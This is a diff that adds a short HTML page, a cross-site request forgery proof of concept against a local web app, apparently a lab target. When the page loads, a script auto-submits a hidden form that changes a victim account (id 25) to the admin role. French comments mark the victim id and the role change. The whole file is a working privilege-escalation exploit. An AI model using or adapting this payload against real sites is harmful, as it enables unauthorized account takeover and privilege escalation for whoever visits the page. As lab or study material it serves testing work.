@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <form action="http://avenix.local:9998/?action=account.submit" method="POST">
+      <input type="hidden" name="id" value="25"> <!-- ID de la victime -->
+      <input type="hidden" name="role" value="admin"> <!-- Changement du rôle -->
+      <input type="hidden" name="profile_picture" value="/img/users/everyone.png"> 
+      <input type="hidden" name="email" value="test@gmail.com">
+      <input type="hidden" name="name" value="test">
+      <input type="submit" value="Submit">
+    </form>
+
+    <script>
+      document.forms[0].submit(); 
+    </script>
+  </body>
+</html>
